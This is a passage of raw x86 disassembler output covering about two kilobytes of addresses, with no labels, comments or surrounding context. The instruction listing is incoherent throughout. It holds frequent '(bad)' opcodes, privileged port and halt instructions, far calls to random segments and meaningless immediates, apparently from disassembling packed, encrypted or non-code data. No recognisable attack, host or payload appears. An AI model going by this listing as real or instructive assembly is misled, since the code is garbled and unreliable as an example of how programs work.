  404517:	xchg   DWORD PTR [edx],eax
  404519:	and    BYTE PTR [eax-0x2],ch
  40451c:	rol    DWORD PTR [esi-0x6c],cl
  40451f:	dec    eax
  404520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404521:	test   eax,0x5ad98d8
  404526:	loope  0x4044a9
  404528:	adc    cl,al
  40452a:	jns    0x4044cb
  40452c:	in     eax,0x2e
  40452e:	or     esp,DWORD PTR [eax+0x69]
  404531:	inc    ebx
  404532:	loope  0x4045aa
  404534:	dec    ecx
  404535:	sar    bh,0xc1
  404538:	push   ds
  404539:	hlt    
  40453a:	xchg   edx,eax
  40453b:	fcmovb st,st(5)
  40453d:	jmp    0x1a48bbf7
  404542:	jp     0x4044d2
  404544:	(bad)  
  404545:	loop   0x404547
  404547:	cmp    ch,BYTE PTR [esp+edi*4]
  40454a:	pop    ss
  40454b:	push   eax
  40454c:	fnstsw WORD PTR [edi-0x7d]
  40454f:	pop    eax
  404550:	inc    eax
  404551:	ds mov esi,0xafcc5d52
  404557:	repz or DWORD PTR [edx+edi*1+0x37de54ed],ecx
  40455f:	xchg   edi,eax
  404560:	push   eax
  404561:	hlt    
  404562:	pop    edi
  404563:	push   es
  404564:	xchg   edi,eax
  404565:	ror    BYTE PTR [edi],cl
  404567:	ret    0x460f
  40456a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40456b:	mov    dl,0x7a
  40456d:	xor    ah,BYTE PTR [ecx]
  40456f:	pop    edx
  404570:	cwde   
  404571:	push   0x67
  404573:	xchg   esp,eax
  404574:	ss sti 
  404576:	shl    BYTE PTR [edx+0x63423807],1
  40457c:	pusha  
  40457d:	jbe    0x4045e9
  40457f:	std    
  404580:	pusha  
  404581:	dec    ebx
  404582:	pop    esp
  404583:	add    al,0xfe
  404585:	pop    ss
  404586:	imul   edi,DWORD PTR ds:0x50aa58ab,0x353aa76e
  404590:	test   BYTE PTR [ebp+0x366b4115],0xf3
  404597:	adc    ebx,DWORD PTR [edx]
  404599:	mul    BYTE PTR [edx]
  40459b:	sub    eax,DWORD PTR [edi-0x4e]
  40459e:	call   0x8c2224f1
  4045a3:	test   DWORD PTR [edi],esp
  4045a5:	repz inc esi
  4045a7:	mul    BYTE PTR [ecx+0x7e017e29]
  4045ad:	nop
  4045ae:	jnp    0x404544
  4045b0:	loopne 0x4045ca
  4045b2:	sub    DWORD PTR [eax+0x3e],0xfe58697b
  4045b9:	sbb    DWORD PTR [edi-0x3fbebade],ecx
  4045bf:	int    0x8e
  4045c1:	jnp    0x4045b4
  4045c3:	jecxz  0x404561
  4045c5:	mov    edi,0x33053fe2
  4045ca:	aas    
  4045cb:	shl    bh,0xa6
  4045ce:	mov    bh,0xcd
  4045d0:	shr    esp,0xca
  4045d3:	jg     0x4045b4
  4045d5:	add    esp,DWORD PTR [esi+0x73]
  4045d8:	popa   
  4045d9:	dec    ecx
  4045da:	sub    bl,ch
  4045dc:	xor    al,0x55
  4045de:	inc    edi
  4045df:	cmp    BYTE PTR [edi+0x3ef9410d],ch
  4045e5:	mov    esp,0x7d5b6381
  4045ea:	jmp    0xbf71a8ce
  4045ef:	jns    0x404586
  4045f1:	pop    ebx
  4045f2:	jbe    0x40463b
  4045f4:	test   dh,0x6b
  4045f7:	lahf   
  4045f8:	call   0xb0be:0x42ec20a8
  4045ff:	jmp    0xc3aefea2
  404604:	leave  
  404605:	xchg   ebx,eax
  404607:	jg     0x40458d
  404609:	call   0xaa030653
  40460e:	xchg   DWORD PTR [edi+eax*8-0x58],edx
  404612:	mov    dh,0x81
  404614:	hlt    
  404615:	icebp  
  404616:	xchg   ebp,eax
  404617:	pop    esi
  404618:	xlat   BYTE PTR ds:[ebx]
  404619:	push   edi
  40461a:	mov    al,0xfb
  40461c:	retf   0xc820
  40461f:	pop    esi
  404620:	mov    DWORD PTR [eax-0x2cc1c1d6],ecx
  404626:	popf   
  404627:	stos   DWORD PTR es:[edi],eax
  404628:	adc    eax,0xd8828002
  40462d:	inc    ecx
  40462e:	push   ecx
  40462f:	cmp    bh,cl
  404631:	out    dx,al
  404632:	out    0x5c,eax
  404634:	and    BYTE PTR [ebx+eiz*8],cl
  404637:	arpl   WORD PTR [edi-0xbcb0ced],sp
  40463d:	sbb    eax,0x82f08f5
  404642:	leave  
  404643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404644:	adc    DWORD PTR [esp+edx*2+0x60b81de2],ebp
  40464b:	xchg   esp,eax
  40464c:	push   eax
  40464d:	aas    
  40464e:	xor    dh,bh
  404650:	cmc    
  404651:	lea    eax,[edx+ebp*2]
  404654:	cwde   
  404655:	and    al,0xc0
  404657:	sub    DWORD PTR [esi+0x7dc11bee],eax
  40465d:	mov    eax,ds:0xae1d408
  404662:	push   cs
  404663:	pusha  
  404664:	pop    ebp
  404665:	retf   0x90e7
  404668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404669:	inc    edx
  40466a:	jl     0x404657
  40466c:	jge    0x4045ff
  40466e:	fisub  DWORD PTR [eax-0x7abdc762]
  404674:	push   ebx
  404675:	or     DWORD PTR [edi+ebp*1-0x56],esp
  404679:	sbb    esi,DWORD PTR [edx+0x6b]
  40467c:	adc    DWORD PTR [esi+0x75],ebp
  40467f:	sub    eax,0x33f37678
  404684:	mov    dl,0xbd
  404686:	arpl   WORD PTR [edi-0x72124d2c],si
  40468c:	mov    al,0xcf
  40468e:	mov    ecx,0xb40ab3de
  404693:	dec    edi
  404694:	js     0x4046fc
  404696:	xor    bl,BYTE PTR [ecx-0x22]
  404699:	push   ecx
  40469a:	or     ebx,ebx
  40469c:	mov    dh,0xb2
  40469e:	xchg   esi,eax
  40469f:	call   0x33a7:0x18c17ce0
  4046a6:	adc    ebp,DWORD PTR [edi+0x39ca7318]
  4046ac:	xchg   bl,ah
  4046ae:	cld    
  4046af:	sbb    ax,0x6443
  4046b3:	aaa    
  4046b4:	dec    esp
  4046b5:	push   edi
  4046b6:	sti    
  4046b7:	xchg   edx,eax
  4046b8:	inc    esi
  4046b9:	push   ss
  4046ba:	inc    ebx
  4046bb:	pop    ecx
  4046bc:	jo     0x4046f3
  4046be:	sar    BYTE PTR [eax+0x67],0xd9
  4046c2:	inc    ecx
  4046c3:	shl    BYTE PTR [ebx+0x28],0x49
  4046c7:	pop    ebx
  4046c8:	push   esi
  4046c9:	call   0xbeba:0x3d8df356
  4046d0:	sub    BYTE PTR [ecx+0x1e],bl
  4046d3:	aam    0x6e
  4046d5:	push   es
  4046d6:	(bad)  
  4046d7:	adc    eax,0x8aa7a2a5
  4046dc:	xlat   BYTE PTR ds:[ebx]
  4046dd:	xchg   ebx,eax
  4046de:	push   edx
  4046df:	mov    esi,0xddd9a5ec
  4046e4:	dec    esp
  4046e5:	dec    ebp
  4046e6:	stos   BYTE PTR es:[edi],al
  4046e7:	and    BYTE PTR [eax],dl
  4046e9:	lods   eax,DWORD PTR ds:[esi]
  4046ea:	pop    esp
  4046eb:	dec    esp
  4046ec:	mov    ds:0x50ced667,eax
  4046f1:	in     al,0xf9
  4046f3:	test   DWORD PTR [edx],0x10769f4f
  4046f9:	xor    ebp,DWORD PTR [esi+0x7d067293]
  4046ff:	aam    0xa6
  404701:	cmp    al,0xf5
  404703:	rcl    DWORD PTR [ebx+0x36],1
  404706:	call   DWORD PTR [esi+0xe272574]
  40470c:	jmp    0x404744
  40470e:	adc    ch,ah
  404710:	out    dx,eax
  404711:	ja     0x40478f
  404713:	mov    ch,0xfc
  404715:	cmp    DWORD PTR [ecx],esi
  404717:	inc    esi
  404718:	neg    esi
  40471a:	mov    cl,0xc1
  40471c:	data16 mov BYTE PTR [edi],ch
  40471f:	loope  0x404703
  404721:	sbb    al,0xde
  404723:	jmp    0x3643:0x3f5ac673
  40472a:	nop
  40472b:	inc    edi
  40472c:	test   eax,0x8bae8082
  404731:	ret    0x825c
  404734:	adc    al,0xfd
  404736:	inc    ecx
  404737:	jmp    0xc4e38fc5
  40473c:	xchg   edx,eax
  40473d:	test   DWORD PTR [esi-0x524db29d],esp
  404743:	jnp    0x40472c
  404745:	cmp    bl,BYTE PTR [esi-0x4a92078a]
  40474b:	mov    ecx,0xd62f86f0
  404750:	jo     0x4047b7
  404752:	int3   
  404753:	aas    
  404754:	jbe    0x40479b
  404756:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  404758:	add    ch,BYTE PTR [eax]
  40475a:	outs   dx,DWORD PTR ds:[esi]
  40475b:	les    edi,FWORD PTR [ebx-0x12]
  40475e:	lea    eax,[edi]
  404760:	mov    edi,DWORD PTR [ebx]
  404762:	xor    al,0xd9
  404764:	inc    edx
  404765:	iret   
  404766:	mov    ebx,0x615f0555
  40476b:	jne    0x4047c7
  40476d:	imul   ecx,esi,0xf87a2702
  404773:	out    0xf,al
  404775:	rol    DWORD PTR [ecx],cl
  404777:	jecxz  0x40474f
  404779:	idiv   BYTE PTR [ecx]
  40477b:	cmp    ecx,DWORD PTR [edi-0x7cdf8a4f]
  404781:	sti    
  404782:	leave  
  404783:	(bad)  
  404784:	adc    dh,BYTE PTR [ecx]
  404786:	aas    
  404787:	(bad)  
  404788:	lods   al,BYTE PTR ds:[esi]
  404789:	(bad)  
  40478a:	cli    
  40478b:	leave  
  40478c:	aaa    
  40478d:	(bad)  
  40478e:	retf   
  40478f:	jle    0x4047a9
  404791:	arpl   WORD PTR [esi],di
  404793:	and    DWORD PTR [esp+eax*1-0x36d46cd],esp
  40479a:	jl     0x40472a
  40479c:	lock retf 0xcd26
  4047a0:	adc    DWORD PTR [esi+edx*8],eax
  4047a3:	cli    
  4047a4:	js     0x4047a1
  4047a6:	ret    
  4047a7:	mov    bh,BYTE PTR [ebp+eiz*8+0x7c]
  4047ab:	dec    ecx
  4047ac:	shl    DWORD PTR [esp+edi*1+0x20],1
  4047b0:	nop
  4047b1:	lock test BYTE PTR [edi-0xd],al
  4047b5:	test   BYTE PTR [edx],ch
  4047b7:	xchg   edx,eax
  4047b8:	adc    bh,BYTE PTR [edx+0x100854b4]
  4047be:	int    0x91
  4047c0:	lods   eax,DWORD PTR ds:[esi]
  4047c1:	cmp    eax,0xc9510c0c
  4047c6:	or     BYTE PTR [esp+ebx*8+0x1dcccd4a],cl
  4047cd:	popf   
  4047ce:	stos   DWORD PTR es:[edi],eax
  4047cf:	sub    BYTE PTR [eax+0x27633e60],ch
  4047d5:	ins    DWORD PTR es:[edi],dx
  4047d6:	shl    BYTE PTR [eax],cl
  4047d8:	inc    esi
  4047d9:	fldcw  WORD PTR [ebx+eax*1]
  4047dc:	push   eax
  4047dd:	sub    BYTE PTR [edi-0x52],dh
  4047e0:	paddd  mm7,QWORD PTR [ecx]
  4047e3:	inc    ebp
  4047e4:	jbe    0x404854
  4047e6:	sbb    al,BYTE PTR [esi+0x59ff87bd]
  4047ec:	jo     0x4047b6
  4047ee:	sbb    cl,BYTE PTR [ebx]
  4047f0:	and    eax,0xb0cc0d03
  4047f5:	sar    ah,0x19
  4047f8:	adc    dl,BYTE PTR [eax-0x3a03f1bc]
  4047fe:	push   ds
  4047ff:	jl     0x404853
  404801:	mov    ds:0x309b013e,eax
  404806:	cdq    
  404807:	sbb    al,0xa6
  404809:	pop    ds
  40480a:	sub    eax,0x8be6910d
  40480f:	inc    esi
  404810:	dec    edx
  404811:	push   edi
  404812:	xchg   BYTE PTR [esi],dh
  404814:	push   edx
  404815:	jle    0x4047ef
  404817:	popa   
  404818:	data16 or al,0x6b
  40481c:	ret    
  40481d:	ds call 0xef98:0xdd0b29ce
  404825:	jmp    0x4cd6ac0
  40482a:	rcr    DWORD PTR [eax+0x552bcc06],0xf8
  404831:	or     DWORD PTR [ebx],ebx
  404833:	cdq    
  404834:	add    al,0x11
  404836:	add    BYTE PTR [ecx+0x6ae1e7c6],al
  40483c:	fcmovnbe st,st(2)
  40483e:	pop    ecx
  40483f:	adc    BYTE PTR [ecx+0x34],cl
  404842:	imul   BYTE PTR [ecx]
  404844:	(bad)  
  404846:	jp     0x40487e
  404848:	sub    BYTE PTR [eax+0x4a319abe],ah
  40484e:	inc    ebp
  40484f:	(bad)  
  404850:	iret   
  404851:	jecxz  0x404830
  404853:	mov    al,ds:0x5661dfea
  404858:	jmp    0x652:0x7b0c7c3e
  40485f:	stos   DWORD PTR es:[edi],eax
  404860:	in     al,dx
  404861:	ret    0x939c
  404864:	inc    ebp
  404865:	test   BYTE PTR [esi],al
  404867:	ret    
  404868:	and    eax,0xaefda732
  40486d:	push   cs
  40486e:	xchg   esp,eax
  40486f:	and    DWORD PTR [esi-0x12a915e8],esi
  404875:	in     eax,dx
  404876:	popa   
  404877:	sbb    BYTE PTR [edx],dh
  404879:	stos   DWORD PTR es:[edi],eax
  40487a:	jae    0x40486b
  40487c:	xor    BYTE PTR [ebx-0x3],ch
  40487f:	(bad)  
  404880:	fmul   DWORD PTR [edi+0x211067a0]
  404886:	sbb    eax,0x330932df
  40488b:	mov    ds:0x51a007f8,al
  404890:	push   ecx
  404891:	or     BYTE PTR [edx-0x75f8f2a2],dh
  404897:	sub    eax,DWORD PTR [edx+0x6a90e06b]
  40489d:	jle    0x4048b6
  40489f:	jmp    0x1460:0xbf5a366a
  4048a6:	push   di
  4048a8:	pop    edi
  4048a9:	xchg   esp,eax
  4048aa:	out    dx,eax
  4048ab:	jnp    0x404864
  4048ad:	(bad)  
  4048ae:	in     al,dx
  4048af:	mov    edi,0xa4483565
  4048b4:	cs push esp
  4048b6:	out    0xe7,al
  4048b8:	push   cs
  4048b9:	jne    0x404880
  4048bb:	das    
  4048bc:	cli    
  4048bd:	into   
  4048be:	stos   DWORD PTR es:[edi],eax
  4048bf:	dec    esp
  4048c0:	inc    eax
  4048c1:	jne    0x40486d
  4048c3:	loopne 0x4048ec
  4048c5:	jo     0x4048a4
  4048c7:	inc    esi
  4048c8:	dec    eax
  4048c9:	xor    ch,BYTE PTR [edx-0x69]
  4048cc:	or     BYTE PTR [edi-0x23],cl
  4048cf:	sti    
  4048d0:	push   ebp
  4048d1:	addr16 push eax
  4048d3:	jmp    0x4048fc
  4048d5:	and    ah,ah
  4048d7:	cwde   
  4048d8:	int    0x7f
  4048da:	mov    edi,DWORD PTR [ebp+0xfe6c5e]
  4048e0:	addr16 mov al,0xfe
  4048e3:	dec    ecx
  4048e4:	pop    edx
  4048e5:	push   esp
  4048e6:	pop    es
  4048e7:	neg    BYTE PTR [esi-0x31647d09]
  4048ed:	mov    ds:0x4df33d3b,al
  4048f2:	call   0xc952:0x302fd1bd
  4048f9:	out    0xdd,al
  4048fb:	fimul  DWORD PTR gs:[edx+eiz*1+0x3f]
  404900:	mov    DWORD PTR [esi+0x6c60b9f],eax
  404906:	xor    al,dl
  404908:	loope  0x404943
  40490a:	jmp    0x404954
  40490c:	gs in  eax,0x29
  40490f:	jle    0x40489a
  404911:	dec    ebx
  404912:	inc    esp
  404913:	arpl   sp,sp
  404915:	bound  cx,DWORD PTR [eax+0x209584e2]
  40491c:	pop    eax
  40491d:	faddp  st(7),st
  40491f:	aas    
  404920:	idiv   esp
  404922:	cwde   
  404923:	call   FWORD PTR [ebp+0x74e5a8b2]
  404929:	mov    ds:0x807e8e59,eax
  40492e:	mov    ebx,0x1c4ec52a
  404933:	ret    0xb68e
  404936:	inc    ebp
  404937:	sub    al,0xeb
  404939:	and    DWORD PTR [eax+0x63369047],esi
  40493f:	mov    edx,DWORD PTR ds:0xda3f4c7
  404945:	call   0x7867:0x2c8fcf6a
  40494c:	add    DWORD PTR [ebx+0x1b],0xc232de42
  404953:	xor    eax,0xdd8b9aad
  404958:	mov    edx,0x352f6dfa
  40495d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40495e:	sbb    DWORD PTR [esi-0x1],ebp
  404961:	dec    edi
  404962:	fadd   DWORD PTR [eax]
  404964:	adc    ebp,DWORD PTR [esi-0x12d6c6db]
  40496a:	ss cmc 
  40496c:	cmp    eax,0xb42d820b
  404971:	test   al,0xac
  404973:	push   es
  404974:	ins    BYTE PTR es:[edi],dx
  404975:	cwde   
  404976:	sti    
  404977:	xor    al,0x2
  404979:	jecxz  0x40490e
  40497b:	or     eax,0x2ac6a563
  404980:	(bad)  
  404982:	jmp    0x4049b5
  404984:	cld    
  404985:	mov    ds:0x5fad5dd6,eax
  40498a:	add    al,0xa0
  40498c:	or     BYTE PTR [esi+0x65e5775b],cl
  404992:	add    al,bh
  404994:	test   al,0x62
  404996:	dec    BYTE PTR [edi+0x21104e32]
  40499c:	push   ss
  40499d:	aam    0x3b
  40499f:	or     eax,0x1056e985
  4049a4:	adc    BYTE PTR [eax+0x78dca74a],0xc2
  4049ab:	jge    0x4049ac
  4049ad:	fimul  WORD PTR [ebx-0x7eb57f26]
  4049b3:	repz pop eax
  4049b5:	cdq    
  4049b6:	mov    ch,0xb2
  4049b8:	dec    ebx
  4049b9:	mov    ah,0x7c
  4049bb:	lods   al,BYTE PTR ds:[esi]
  4049bc:	inc    edx
  4049bd:	dec    esp
  4049be:	fwait
  4049bf:	xor    DWORD PTR [esi+0x78],ebx
  4049c2:	call   0x6d12:0x6eb3ac47
  4049c9:	adc    al,0xe5
  4049cb:	mov    edx,0x8a2a5438
  4049d0:	xor    ebx,DWORD PTR [edi+0x2f]
  4049d3:	pop    esi
  4049d4:	icebp  
  4049d5:	gs xchg ecx,eax
  4049d7:	retf   0xb366
  4049da:	push   0x63
  4049dc:	jg     0x404a19
  4049de:	stos   DWORD PTR es:[edi],eax
  4049df:	retf   
  4049e0:	push   DWORD PTR [esi+0x1a29aff9]
  4049e6:	into   
  4049e7:	sbb    ah,dl
  4049e9:	push   es
  4049ea:	fisubr WORD PTR [edi-0xc]
  4049ed:	stc    
  4049ee:	pop    edi
  4049ef:	arpl   WORD PTR [eax+0x1b748f9],dx
  4049f5:	arpl   WORD PTR [edi-0x67],bp
  4049f8:	out    0xaa,al
  4049fa:	mov    eax,0xfba83e78
  4049ff:	or     al,0x51
  404a01:	(bad)  
  404a02:	jmp    FWORD PTR [edi+0x10]
  404a05:	popf   
  404a06:	xor    al,0x43
  404a08:	push   es
  404a09:	xchg   edx,eax
  404a0a:	les    edx,FWORD PTR [eax-0x77]
  404a0d:	inc    esi
  404a0e:	pop    edi
  404a0f:	scas   eax,DWORD PTR es:[edi]
  404a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a11:	(bad)  
  404a12:	iret   
  404a13:	add    BYTE PTR [esi],bl
  404a15:	and    edx,edx
  404a17:	mov    ecx,0x20175109
  404a1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a1d:	idiv   DWORD PTR [esi+0xa1951d]
  404a23:	popf   
  404a24:	push   esi
  404a25:	or     DWORD PTR [ecx],esi
  404a27:	sub    al,0x34
  404a29:	out    0x61,eax
  404a2b:	cmp    DWORD PTR ss:[esi+0x556cf233],esi
  404a32:	stos   BYTE PTR es:[edi],al
  404a33:	pop    ecx
  404a34:	add    eax,0xa579b696
  404a39:	stc    
  404a3a:	sub    esp,ebx
  404a3c:	push   ss
  404a3d:	cmp    eax,0x41ffccbb
  404a42:	adc    al,0xd
  404a44:	or     BYTE PTR ds:0xfdf6a73f,al
  404a4a:	and    bh,ah
  404a4c:	push   ss
  404a4d:	mov    al,ds:0xd7fadf35
  404a52:	dec    esi
  404a53:	je     0x404a05
  404a55:	inc    esp
  404a56:	in     al,0x6a
  404a58:	push   DWORD PTR [edi-0xd]
  404a5b:	scas   eax,DWORD PTR es:[edi]
  404a5c:	xchg   esp,eax
  404a5d:	sbb    bh,BYTE PTR [ebx+0x660fba5]
  404a63:	cmp    BYTE PTR cs:[edx+0x23],al
  404a67:	popa   
  404a68:	or     eax,0x6b6308a6
  404a6d:	pop    ss
  404a6e:	push   ds
  404a6f:	mov    WORD PTR [edi],gs
  404a71:	imul   ecx,DWORD PTR [eax-0x3e],0x311762a9
  404a78:	test   eax,0x2d46c682
  404a7d:	imul   ebx,DWORD PTR [edi],0x10e335b3
  404a83:	pop    ecx
  404a84:	fistp  DWORD PTR [eax-0x7e]
  404a87:	ror    BYTE PTR [ebp+0x7aca07be],1
  404a8d:	push   ss
  404a8e:	stc    
  404a8f:	in     al,dx
  404a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a91:	inc    esp
  404a92:	mov    ds:0x370e99e5,eax
  404a97:	push   edx
  404a98:	adc    eax,0xff778480
  404a9d:	stos   BYTE PTR es:[edi],al
  404a9e:	iret   
  404a9f:	int3   
  404aa0:	mov    bh,0x35
  404aa2:	pop    ss
  404aa3:	xchg   esi,eax
  404aa4:	mov    al,0x12
  404aa6:	cmp    ebp,esp
  404aa8:	fisub  DWORD PTR [ecx]
  404aaa:	ret    0x6e2a
  404aad:	mov    ecx,0xf9f8f570
  404ab2:	pop    edx
  404ab3:	daa    
  404ab4:	test   BYTE PTR [edi+esi*2],dl
  404ab7:	adc    BYTE PTR [edx],ch
  404ab9:	adc    edx,DWORD PTR ds:0xc646059e
  404abf:	fwait
  404ac0:	adc    eax,0x8eedc088
  404ac5:	stos   DWORD PTR es:[edi],eax
  404ac6:	sbb    DWORD PTR [ebp+0x52ddcb76],ebp
  404acc:	clc    
  404acd:	jbe    0x404a8f
  404acf:	lods   eax,DWORD PTR ds:[esi]
  404ad0:	(bad)  
  404ad1:	jae    0x404b17
  404ad3:	adc    DWORD PTR [ebp-0x5f],edx
  404ad6:	or     ebp,esi
  404ad8:	sbb    esi,edx
  404ada:	ins    BYTE PTR es:[edi],dx
  404adb:	fwait
  404adc:	and    ebp,esi
  404ade:	and    esp,DWORD PTR [ebx]
  404ae0:	pop    eax
  404ae1:	xor    ebp,DWORD PTR [edx-0x6da3f7f7]
  404ae7:	daa    
  404ae8:	das    
  404ae9:	mov    al,ds:0x45ef7eae
  404aee:	xchg   edx,eax
  404aef:	xor    ebp,DWORD PTR [edi]
  404af1:	mov    edx,0x2d7675a7
  404af7:	aas    
  404af8:	dec    esi
  404af9:	retf   
  404afa:	pusha  
  404afb:	dec    eax
  404afc:	dec    esi
  404afd:	sub    DWORD PTR [eax+edx*1-0xe],ebx
  404b01:	pop    ebx
  404b02:	mov    WORD PTR [esp+ecx*2],ds
  404b05:	push   ecx
  404b06:	imul   ecx,DWORD PTR [edx],0x4f
  404b09:	imul   ebx,DWORD PTR [ebx],0xffffff90
  404b0c:	jmp    0xa1caaffe
  404b11:	fcom   st(7)
  404b13:	or     eax,0xe452762b
  404b18:	mov    edx,0xe54ef045
  404b1d:	cwde   
  404b1e:	lea    ebx,[ebp-0x3c]
  404b21:	(bad)  
  404b22:	ds ds mov esi,0xc951512c
  404b29:	imul   ebx,DWORD PTR [edx],0x82cbca32
  404b2f:	rcl    DWORD PTR [eax-0x2ae04cc3],0x85
  404b36:	ret    
  404b37:	push   ss
  404b38:	sbb    al,0x2e
  404b3a:	data16 add BYTE PTR [esi-0x44a2c666],bh
  404b41:	rol    ebx,cl
  404b43:	pop    esp
  404b44:	out    dx,al
  404b45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b46:	gs cwde 
  404b48:	mov    WORD PTR [edi+0x1f],?
  404b4b:	dec    edx
  404b4c:	mov    DWORD PTR [ecx+0x60],ecx
  404b4f:	add    eax,0xb2392000
  404b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b55:	mov    ebx,0x6f1ac8bd
  404b5a:	cmp    BYTE PTR [ecx+0x233da231],al
  404b60:	test   BYTE PTR [eax-0x72],ch
  404b63:	js     0x404b8e
  404b65:	loop   0x404b92
  404b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b68:	cmp    eax,0x2b02f0f2
  404b6d:	jecxz  0x404bca
  404b6f:	mov    esi,0x6e77a987
  404b74:	fs xor eax,0x66148e0e
  404b7a:	std    
  404b7b:	int    0x8b
  404b7d:	icebp  
  404b7e:	fbstp  TBYTE PTR [ecx]
  404b80:	loopne 0x404bd1
  404b82:	cmc    
  404b83:	stos   DWORD PTR es:[edi],eax
  404b84:	daa    
  404b85:	lahf   
  404b86:	sahf   
  404b87:	cmp    al,0x41
  404b89:	das    
  404b8a:	fisttp QWORD PTR [ebp-0x6e422719]
  404b90:	scas   eax,DWORD PTR es:[edi]
  404b91:	stos   BYTE PTR es:[edi],al
  404b92:	and    DWORD PTR [ebx+0x5be73711],esp
  404b98:	mov    al,BYTE PTR [edx-0x265fa322]
  404b9e:	add    dh,BYTE PTR [eax]
  404ba0:	shr    eax,cl
  404ba2:	jno    0x404b74
  404ba4:	add    ah,BYTE PTR [edx+ebx*4]
  404ba7:	jle    0x404b58
  404ba9:	(bad)  
  404baa:	push   edi
  404bab:	frstor ds:0x77bbccee
  404bb1:	ds adc al,0x9d
  404bb4:	or     DWORD PTR [ecx+0x7e],esi
  404bb7:	jmp    0x404bad
  404bb9:	ins    DWORD PTR es:[edi],dx
  404bba:	retf   0x9346
  404bbd:	push   0x3d77dbd
  404bc2:	and    eax,0x5c880820
  404bc7:	pop    edi
  404bc8:	pushf  
  404bc9:	push   esi
  404bca:	jb     0x404b63
  404bcc:	bound  ecx,QWORD PTR [ebp+0x38a96ac1]
  404bd2:	add    ecx,DWORD PTR [ecx-0x12]
  404bd5:	dec    ebp
  404bd6:	jp     0x404beb
  404bd8:	leave  
  404bd9:	leave  
  404bda:	push   ds
  404bdb:	push   esi
  404bdc:	hlt    
  404bdd:	and    cl,BYTE PTR [esi+0x1f]
  404be0:	dec    esi
  404be1:	outs   dx,DWORD PTR ds:[esi]
  404be2:	or     al,0x47
  404be4:	test   DWORD PTR [edi-0x34b9894e],edx
  404bea:	cmp    eax,ecx
  404bec:	lea    edi,[edx]
  404bee:	pop    eax
  404bef:	mov    cl,0xe4
  404bf1:	fistp  WORD PTR [ecx-0x20]
  404bf4:	cmc    
  404bf5:	add    BYTE PTR [edx],al
  404bf7:	mov    esi,0x185c616a
  404bfc:	sbb    al,BYTE PTR [ebp-0x2ce7bdbc]
  404c02:	js     0x404bcd
  404c04:	add    edx,DWORD PTR [eax+ecx*8-0x5b4118ba]
  404c0b:	adc    ah,BYTE PTR [edx+0x6d]
  404c0e:	sub    ebp,DWORD PTR [ebx]
  404c10:	icebp  
  404c11:	ja     0x404c90
  404c13:	pop    ds
  404c14:	jmp    0x404c0a
  404c16:	lods   eax,DWORD PTR ds:[esi]
  404c17:	test   bl,0xfb
  404c1a:	rcr    eax,0x99
  404c1d:	call   0xbc33:0xbddb4063
  404c24:	mov    ch,0xc2
  404c26:	push   edx
  404c27:	scas   eax,DWORD PTR es:[edi]
  404c28:	cli    
  404c29:	ja     0x404c1b
  404c2b:	pushf  
  404c2c:	jo     0x404baf
  404c2e:	or     bl,bl
  404c30:	mov    al,ds:0x21033d50
  404c35:	or     al,0x91
  404c37:	cmc    
  404c38:	loope  0x404c60
  404c3a:	inc    ebp
  404c3b:	out    dx,al
  404c3c:	cmp    DWORD PTR [ebp-0x55433a6c],ecx
  404c42:	sub    eax,0x7c896824
  404c47:	mov    esi,0x3b888556
  404c4c:	add    al,BYTE PTR [esi+0x23]
  404c4f:	cwde   
  404c50:	inc    edx
  404c51:	into   
  404c52:	cmp    eax,0x3f8881d0
  404c57:	inc    edx
  404c58:	popa   
  404c59:	in     al,0x47
  404c5b:	jp     0x404c9c
  404c5d:	sub    al,0xc3
  404c5f:	mov    eax,0x9b5d562c
  404c64:	pushf  
  404c65:	icebp  
  404c66:	jl     0x404c42
  404c68:	ficom  DWORD PTR ds:[eax]
  404c6b:	pop    edi
  404c6c:	bnd jne 0x404c72
  404c6f:	daa    
  404c70:	mov    esi,ebp
  404c72:	(bad)  
  404c73:	outs   dx,BYTE PTR ds:[esi]
  404c74:	xchg   ecx,eax
  404c75:	outs   dx,BYTE PTR ds:[esi]
  404c76:	xchg   ecx,eax
  404c77:	lds    ebp,FWORD PTR [eax-0x78]
  404c7a:	jmp    0x419d:0xdddc1d93
  404c81:	pop    ss
  404c82:	mov    ds:0xfc11e22,eax
  404c87:	sbb    BYTE PTR [edx+0x5642323b],0x42
  404c8e:	push   edx
  404c8f:	xchg   ebx,eax
  404c90:	fmul   DWORD PTR [edi+0x32]
  404c93:	(bad)  
  404c94:	xor    BYTE PTR [edi+ecx*1-0x18],al
  404c98:	jno    0x404c59
  404c9a:	add    al,0x27
  404c9c:	jmp    0x449c38be
  404ca1:	pop    ebp
  404ca2:	ins    DWORD PTR es:[edi],dx
  404ca3:	loopne 0x404c8e
  404ca5:	xchg   ebx,eax
  404ca6:	scas   eax,DWORD PTR es:[edi]
  404ca7:	sbb    al,0x28
  404ca9:	lods   al,BYTE PTR ds:[esi]
  404caa:	and    BYTE PTR [edi+0x796948f6],dh
  404cb0:	(bad)  
  404cb1:	cmp    bl,dh
  404cb3:	cdq    
  404cb4:	mov    fs,WORD PTR [ecx+edx*4]
  404cb7:	xchg   dh,dh
  404cb9:	(bad)  
  404cba:	data16 mov ch,0x2c
  404cbd:	iret   
  404cbe:	loope  0x404cc5
  404cc0:	ds ss cwde 
  404cc3:	push   ss
  404cc4:	and    eax,0xaabc5a0f
  404cc9:	xchg   esp,eax
  404cca:	cwde   
  404ccb:	adc    dl,BYTE PTR [ecx-0x18ae7101]
  404cd1:	adc    al,0xc5
  404cd3:	iret   
  404cd4:	mov    al,0x6
  404cd6:	cld    
  404cd7:	aad    0xa1
  404cd9:	sbb    al,0x93
  404cdb:	out    0x2f,eax
  404cdd:	adc    esp,DWORD PTR [eiz*2+0x43c428cc]
  404ce4:	(bad)  
  404ce5:	mov    edx,0x16ce71b5
  404cea:	mov    ah,0x7b
  404cec:	cmp    edx,edx
  404cee:	mov    ds,WORD PTR ds:0x6bf9147e
